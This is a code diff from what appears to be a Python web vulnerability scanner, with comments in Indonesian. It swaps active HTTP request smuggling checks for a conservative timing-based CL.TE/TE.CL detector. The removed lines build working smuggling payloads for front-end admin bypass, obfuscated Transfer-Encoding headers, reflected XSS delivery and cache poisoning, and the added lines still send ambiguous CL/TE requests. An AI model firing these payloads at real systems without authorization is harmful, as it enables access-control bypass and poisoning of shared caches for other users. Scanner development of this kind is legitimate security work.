-                hit = next((r for r in res[1:] if self._smug_admin_text(r.get("body", ""))), None)
-                if hit is not None and b_status in (401, 403, 404, 302) and not self._smug_admin_text(b_body):
-                    self._smug_mark(93, f"CL.TE bypass front-end: baseline GET {ap} -> {b_status}, "
-                                        f"respons hasil smuggle -> {hit['status']} berisi konten admin "
-                                        f"({(hit.get('body') or '')[:110]!r}).",
-                                    "smuggling_cl_te_bypass_frontend")
-                    break
-
-        if 94 not in self._confirmed and (tecl_seen or 92 in self._confirmed) and self._within_budget():
-            ap = "/admin"
-            b_status, b_body, _, _ = self._smug_normal_status(ap)
-            inner = f"GET {ap} HTTP/1.1\r\nHost: {cluster_host}\r\n\r\n"
-            hexlen = format(len(inner.encode("latin-1")), "x")
-            chunked = f"{hexlen}\r\n{inner}\r\n0\r\n\r\n"
-            smuggle = self._smug_build(
-                f"POST {base_path} HTTP/1.1",
-                [("Host", cluster_host), ("Content-Length", str(len(hexlen) + 2)),
-                 ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
-                chunked.encode())
-            res, _, _ = self._smug_exchange([smuggle, self._smug_get("/admin", close=True)], 2)
-            hit = next((r for r in res[1:] if self._smug_admin_text(r.get("body", ""))), None)
-            if hit is not None and b_status in (401, 403, 404, 302) and not self._smug_admin_text(b_body):
-                self._smug_mark(94, f"TE.CL bypass front-end: baseline GET {ap} -> {b_status}, "
-                                    f"respons hasil smuggle -> {hit['status']} berisi konten admin.",
-                                "smuggling_te_cl_bypass_frontend")
-
-        # 102 (0.CL) dan 103 (CL.0) tidak dikonfirmasi dari satu klien: sisa body yang
-        # dieksekusi server terlihat identik dengan pipelining HTTP/1.1 yang sah, sehingga
-        # klaim apa pun akan menjadi false positive. Keduanya dibiarkan not_confirmed.
-
-        # ---------- 106: obfuscating the TE header ----------
-        if 106 not in self._confirmed and self._within_budget():
-            variants = [
-                ("Transfer-Encoding", "xchunked"),
-                ("Transfer-Encoding", " chunked"),
-                ("Transfer-Encoding", "chunked\r\nTransfer-Encoding: x"),
-                ("Transfer-Encoding\t", "chunked"),
-                ("Transfer-Encoding", "chunked, identity"),
-                ("Transfer-encoding", "CHUNKED"),
-            ]
-            for hname, hval in variants:
-                if 106 in self._confirmed or not self._within_budget():
-                    break
-                body = "0\r\n\r\nGET /404-obf HTTP/1.1\r\nX: y\r\n\r\n"
-                smuggle = self._smug_build(
-                    f"POST {base_path} HTTP/1.1",
-                    [("Host", cluster_host), ("Content-Length", str(len(body))),
-                     (hname, hval), ("Connection", "keep-alive")],
-                    body.encode())
-                ok, ev = self._smug_desync(smuggle, "/")
-                if ok:
-                    self._smug_mark(106, f"Obfuscation TE terkonfirmasi ({hname!r}: {hval!r}): " + ev,
-                                    "smuggling_obfuscating_te_header")
-                    break
-
-        # ---------- 95: reveal front-end request rewriting ----------
-        if 95 not in self._confirmed and (clte_seen or 91 in self._confirmed) and self._within_budget():
-            targets: list[tuple[str, str]] = []
-            for pg in pages[:10]:
-                for form in getattr(pg, "forms", [])[:5]:
-                    if (getattr(form, "method", "get") or "get").lower() != "post":
-                        continue
-                    for name, _val, _typ in getattr(form, "fields", [])[:6]:
-                        if (name or "").lower() in ("search", "q", "query", "message", "comment", "text", "name", "email"):
-                            targets.append((getattr(form, "action", self.target_url) or self.target_url, name))
-            if not targets:
-                targets = [(self.target_url, "search")]
-            for rurl, rparam in targets[:2]:
-                if 95 in self._confirmed or not self._within_budget():
-                    break
-                rpath = urlparse(rurl).path or "/"
-                smuggled = (f"POST {rpath} HTTP/1.1\r\nHost: {cluster_host}\r\n"
-                            "Content-Type: application/x-www-form-urlencoded\r\n"
-                            "Content-Length: 120\r\n\r\n" + rparam + "=")
-                body = "0\r\n\r\n" + smuggled
-                smuggle = self._smug_build(
-                    f"POST {base_path} HTTP/1.1",
-                    [("Host", cluster_host), ("Content-Length", "5"),
-                     ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
-                    body.encode())
-                res, _, _ = self._smug_exchange([smuggle, self._smug_get("/", close=True)], 2)
-                for r in res[1:]:
-                    txt = r.get("body") or ""
-                    if re.search(
-                        r"(?:X-Forwarded-(?:For|Host|Proto)|X-Real-IP|X-Client-IP|CF-Connecting-IP)"
-                        r"\s*:\s*(?:https?://)?[A-Za-z0-9*._:-]{3,}",
-                        txt,
-                        re.I,
-                    ):
-                        self._smug_mark(95, f"Rewriting front-end terungkap: header internal ter-refleksi pada respons "
-                                            f"follow-up (HTTP {r['status']}) setelah smuggle ke {rpath} param {rparam}.",
-                                        "smuggling_reveal_frontend_rewriting")
-                        break
-
-        # ---------- 97: deliver reflected XSS ----------
-        if 97 not in self._confirmed and (clte_seen or 91 in self._confirmed) and self._within_budget():
-            xss = "<script>alert(1)</script>"
-            xss_path_value = "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
-            smuggled = f"GET /?search={xss_path_value} HTTP/1.1\r\nHost: {cluster_host}\r\n\r\n"
-            body = "0\r\n\r\n" + smuggled
-            smuggle = self._smug_build(
-                f"POST {base_path} HTTP/1.1",
-                [("Host", cluster_host), ("Content-Length", "5"),
-                 ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
-                body.encode())
-            res, _, _ = self._smug_exchange([smuggle, self._smug_get("/", close=True)], 2)
-            if any(xss in (r.get("body") or "") for r in res[1:]):
-                self._smug_mark(97, "Smuggled request menghasilkan reflected XSS payload tanpa encoding pada "
-                                    "respons follow-up.", "smuggling_deliver_reflected_xss")
-
-        # ---------- 107: web cache poisoning via smuggling ----------
-        if 107 not in self._confirmed and (clte_seen or 91 in self._confirmed) and self._within_budget():
-            poison_path = f"/?satria_smug={token}"
-            poison_marker = f"satria-smuggle-{token}.invalid"
-            smuggled = (
-                f"GET {poison_path} HTTP/1.1\r\nHost: {cluster_host}\r\n"
-                f"X-Forwarded-Host: {poison_marker}\r\n\r\n"
+        # Dua baseline pada koneksi baru memastikan target responsif sebelum
+        # interpretasi timing. Path unik menghindari cache hit yang sudah ada.
+        baseline_path = request_path
+        baselines: list[tuple[float, int | None]] = []
+        for _ in range(2):
+            if not self._within_budget():
+                return
+            elapsed, status, error = self._smug_timing_trial(
+                self._smug_get(baseline_path, close=True), timeout=timeout
             )
-            body = "0\r\n\r\n" + smuggled
-            smuggle = self._smug_build(
-                f"POST {base_path} HTTP/1.1",
-                [("Host", cluster_host), ("Content-Length", "5"),
-                 ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
-                body.encode())
-            baseline, _, _ = self._smug_exchange([self._smug_get(poison_path, close=True)], 1)
-            if baseline and self._within_budget():
-                self._smug_exchange([smuggle], 1)
-                after_first, _, _ = self._smug_exchange([self._smug_get(poison_path, close=True)], 1)
-                after_second, _, _ = self._smug_exchange([self._smug_get(poison_path, close=True)], 1)
-                if baseline and after_first and after_second:
-                    base = baseline[0]
-                    first = after_first[0]
-                    second = after_second[0]
-                    cache_hdr = " ".join(
-                        str(v) for k, v in second["headers"].items()
-                        if k.lower() in ("x-cache", "x-cache-status", "cf-cache-status", "age")
-                    ).lower()
-                    first_location = str(first["headers"].get("location", ""))
-                    second_location = str(second["headers"].get("location", ""))
-                    marker_reflected = (
-                        poison_marker in (first.get("body") or "")
-                        or poison_marker in first_location
-                    )
-                    stable_poison = (
-                        poison_marker in (second.get("body") or "")
-                        or poison_marker in second_location
-                    )
-                    explicit_cache_hit = bool(re.search(r"\b(?:hit|cached)\b", cache_hdr))
-                    baseline_clean = (
-                        poison_marker not in (base.get("body") or "")
-                        and poison_marker not in str(base["headers"].get("location", ""))
-                    )
-                    if (
-                        marker_reflected and stable_poison and explicit_cache_hit
-                        and baseline_clean and first["status"] == second["status"]
-                    ):
-                        self._smug_mark(
-                            107,
-                            f"Cache poisoning via smuggling terkonfirmasi: marker unik {poison_marker} "
-                            f"muncul pada dua respons sesudah probe, baseline bersih, dan cache "
-                            f"memberi status HIT ({cache_hdr[:80]}).",
-                            "smuggling_web_cache_poisoning",
-                        )
+            if status is None or error == "connect_failed":
+                self._scan_progress_event("Baseline HTTP/1 tidak memperoleh respons; smuggling tidak diuji.")
+                return
+            baselines.append((elapsed, status))
+        baseline_elapsed = statistics.median([x[0] for x in baselines])
+        baseline_statuses = {x[1] for x in baselines}
+        if len(baseline_statuses) != 1 or baseline_elapsed >= timeout * 0.55:
+            self._scan_progress_event(
+                f"Baseline tidak stabil/lambat ({baseline_elapsed:.2f} dtk); "
+                "timing smuggling tidak dapat dinilai."
+            )
+            return
 
-        # ---------- 112: server-side pause-based desync ----------
-        if 112 not in self._confirmed and self._within_budget():
-            baseline_status, _baseline_body, _, _ = self._smug_normal_status("/")
-            if baseline_status is not None and baseline_status not in (400, 404, 405, 501):
-                try:
-                    pause_seconds = float(os.getenv("SATRIA_SMUG_PAUSE_SECONDS", "6"))
-                except (TypeError, ValueError):
-                    pause_seconds = 6.0
-                pause_seconds = max(2.0, min(8.0, pause_seconds))
-                confirmed_trials: list[str] = []
-                for attempt in range(2):
-                    if not self._within_budget():
-                        break
-                    unique_path = f"/404-{token}-{attempt}"
-                    # Body merupakan request kedua yang lengkap. CL disetel persis ke
-                    # panjang byte request itu; kirim header saja, tunggu read-timeout,
-                    # baru kirim body agar backend dapat memperlakukannya sebagai request baru.
-                    delayed_request = self._smug_get(unique_path, close=False)
-                    smuggle_headers = self._smug_build(
-                        f"POST {base_path} HTTP/1.1",
-                        [
-                            ("Host", cluster_host),
-                            ("Content-Length", str(len(delayed_request))),
-                            ("Connection", "keep-alive"),
-                        ],
-                        b"",
-                    )
-                    self._scan_progress_event(
-                        f"HTTP smuggling 112: jeda {pause_seconds:.1f} dtk setelah header; "
-                        f"percobaan {attempt + 1}/2"
-                    )
-                    sequence = [
-                        smuggle_headers,
-                        delayed_request,
-                        self._smug_get("/", close=True),
-                    ]
-                    responses, elapsed, err = self._smug_exchange(
-                        sequence,
-                        expect=2,
-                        timeout=max(10.0, pause_seconds + 6.0),
-                        pause=pause_seconds,
-                    )
-                    second = responses[1] if len(responses) > 1 else None
-                    if (
-                        second is not None
-                        and second.get("status") == 404
-                        and baseline_status != 404
-                    ):
-                        confirmed_trials.append(
-                            f"attempt {attempt + 1}: respons kedua HTTP 404 pada {unique_path} ({elapsed:.2f}s)"
-                        )
-                    if err == "budget_exhausted":
-                        break
-                if len(confirmed_trials) == 2:
-                    self._smug_mark(
-                        112,
-                        f"Pause-based desync terkonfirmasi dua kali; baseline GET / HTTP {baseline_status}; "
-                        f"jeda {pause_seconds:.1f} dtk; " + "; ".join(confirmed_trials),
-                        "smuggling_pause_based",
-                    )
+        def run_timing_probe(raw: bytes, label: str) -> tuple[bool, list[float], str]:
+            elapsed_values: list[float] = []
+            timeout_confirmations: list[bool] = []
+            details: list[str] = []
+            for attempt in range(2):
+                if not self._within_budget():
+                    break
+                elapsed, status, error = self._smug_timing_trial(raw, timeout=timeout)
+                elapsed_values.append(elapsed)
+                timeout_confirmations.append(
+                    status is None and error == "no_response_before_timeout"
+                )
+                details.append(
+                    f"{attempt + 1}/2: {elapsed:.2f}s status={status or 'none'} "
+                    f"({error or 'response'})"
+                )
+            delayed = (
+                len(elapsed_values) == 2
+                and all(timeout_confirmations)
+                and all(x >= max(timeout * 0.78, baseline_elapsed + 1.8) for x in elapsed_values)
+            )
+            self._scan_progress_event(
+                f"{label}: baseline {baseline_elapsed:.2f}s; " + "; ".join(details)
+            )
+            return delayed, elapsed_values, "; ".join(details)
+
+        # PortSwigger CL.TE timing vector:
+        # Content-Length=4 membuat front-end memotong body sebelum terminator chunk;
+        # backend yang memakai Transfer-Encoding menunggu byte chunk berikutnya.
+        cl_te_raw = self._smug_build(
+            f"POST {request_path} HTTP/1.1",
+            [
+                ("Host", host),
+                ("Content-Type", "application/x-www-form-urlencoded"),
+                ("Content-Length", "4"),
+                ("Transfer-Encoding", "chunked"),
+                ("Connection", "keep-alive"),
+                ("Cache-Control", "no-cache"),
+            ],
+            b"1\r\nA\r\nX",
+        )
+        cl_te_delayed, cl_te_times, cl_te_details = run_timing_probe(cl_te_raw, "CL.TE")
+        if cl_te_delayed:
+            self._smug_mark(
+                91,
+                f"CL.TE timing terkonfirmasi: dua baseline GET merespons normal "
+                f"(median {baseline_elapsed:.2f}s), sedangkan dua request ambigu tidak "
+                f"mendapat respons sampai timeout {timeout:.1f}s "
+                f"({cl_te_details}); probe memakai koneksi terpisah dan marker {token}.",
+                "smuggling_cl_te_timing",
+            )
+            self._smug_mark(
+                104,
+                f"Basic CL.TE terkonfirmasi oleh timing differential yang sama: {cl_te_details}.",
+                "smuggling_basic_cl_te",
+            )
+            return
+
+        # TE.CL baru diuji jika CL.TE tidak terindikasi, mengikuti rekomendasi
+        # PortSwigger untuk meminimalkan potensi gangguan.
+        te_cl_raw = self._smug_build(
+            f"POST {request_path} HTTP/1.1",
+            [
+                ("Host", host),
+                ("Content-Type", "application/x-www-form-urlencoded"),
+                ("Content-Length", "6"),
+                ("Transfer-Encoding", "chunked"),
+                ("Connection", "keep-alive"),
+                ("Cache-Control", "no-cache"),
+            ],
+            b"0\r\n\r\nX",
+        )
+        te_cl_delayed, te_cl_times, te_cl_details = run_timing_probe(te_cl_raw, "TE.CL")
+        if te_cl_delayed:
+            self._smug_mark(
+                92,
+                f"TE.CL timing terkonfirmasi: dua baseline GET merespons normal "
+                f"(median {baseline_elapsed:.2f}s), sedangkan dua request ambigu tidak "
+                f"mendapat respons sampai timeout {timeout:.1f}s "
+                f"({te_cl_details}); CL.TE diuji lebih dahulu dan tidak terindikasi.",
+                "smuggling_te_cl_timing",
+            )
+            self._smug_mark(
+                105,
+                f"Basic TE.CL terkonfirmasi oleh timing differential yang sama: {te_cl_details}.",
+                "smuggling_basic_te_cl",
+            )
+            return
+
+        self._scan_progress_event(
+            "Tidak ditemukan differential timing CL.TE/TE.CL yang konsisten. "
+            "Varian H2, CL.0/0.CL, queue poisoning, cache poisoning, dan eksploitasi "
+            "yang memerlukan trafik korban tidak diklaim tanpa metode pembuktian khusus."
+        )
 
     def phase_ssrf(self, pages: list[Page], points: list[Point]) -> None:
         """Deteksi konservatif SSRF (84-90). Konfirmasi hanya pada bukti kuat:
